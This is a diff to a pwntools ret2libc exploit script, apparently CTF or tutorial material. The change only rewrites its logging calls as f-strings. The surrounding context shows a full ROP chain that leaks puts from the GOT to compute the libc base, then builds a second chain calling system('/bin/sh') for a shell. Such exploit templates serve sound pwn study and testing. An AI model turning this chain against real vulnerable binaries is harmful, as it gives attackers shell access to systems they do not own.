@@ -58,13 +58,13 @@ PUTS_PLT = elf.plt['puts'] #PUTS_PLT = elf.symbols["puts"] # This is also valid 
 MAIN_PLT = elf.symbols['main']
 POP_RDI = (rop.find_gadget(['pop rdi', 'ret']))[0] #Same as ROPgadget --binary vuln | grep "pop rdi"
 
-log.info("Main start: " + hex(MAIN_PLT))
-log.info("Puts plt: " + hex(PUTS_PLT))
-log.info("pop rdi; ret  gadget: " + hex(POP_RDI))
+log.info(f"Main start: {hex(MAIN_PLT)}")
+log.info(f"Puts plt: {hex(PUTS_PLT)}")
+log.info(f"pop rdi; ret  gadget: {hex(POP_RDI)}")
 
 def get_addr(func_name):
     FUNC_GOT = elf.got[func_name]
-    log.info(func_name + " GOT @ " + hex(FUNC_GOT))
+    log.info(f"{func_name} GOT @ {hex(FUNC_GOT)}")
     # Create rop chain
     rop1 = OFFSET + p64(POP_RDI) + p64(FUNC_GOT) + p64(PUTS_PLT) + p64(MAIN_PLT)
 
@@ -76,12 +76,12 @@ def get_addr(func_name):
     #Parse leaked address
     recieved = p.recvline().strip()
     leak = u64(recieved.ljust(8, "\x00"))
-    log.info("Leaked libc address,  "+func_name+": "+ hex(leak))
+    log.info(f"Leaked libc address,  {func_name}: {hex(leak)}")
     #If not libc yet, stop here
     if libc != "":
         libc.address = leak - libc.symbols[func_name] #Save libc base
-        log.info("libc base @ %s" % hex(libc.address))
-    
+        log.info(f"libc base @ {hex(libc.address)}")
+
     return hex(leak)
 
 get_addr("puts") #Search for puts address in memmory to obtains libc base
@@ -100,8 +100,8 @@ BINSH = next(libc.search("/bin/sh")) #Verify with find /bin/sh
 SYSTEM = libc.sym["system"]
 EXIT = libc.sym["exit"]
 
-log.info("bin/sh %s " % hex(BINSH))
-log.info("system %s " % hex(SYSTEM))
+log.info(f"bin/sh {hex(BINSH)} ")
+log.info(f"system {hex(SYSTEM)} ")
 
 rop2 = OFFSET + p64(POP_RDI) + p64(BINSH) + p64(SYSTEM) + p64(EXIT)
 
